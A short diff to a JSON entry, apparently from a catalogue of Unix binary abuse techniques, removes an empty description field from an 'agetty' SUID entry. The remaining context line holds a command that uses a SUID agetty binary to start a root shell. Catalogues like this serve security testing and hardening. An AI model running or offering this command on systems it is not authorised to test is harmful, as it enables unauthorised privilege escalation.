@@ -2,7 +2,7 @@
   "functions": {
     "suid": [
       {
-        "description": "",
+        
         "code": "./agetty -o -p -l /bin/sh -a root tty\n"
       }
     ]
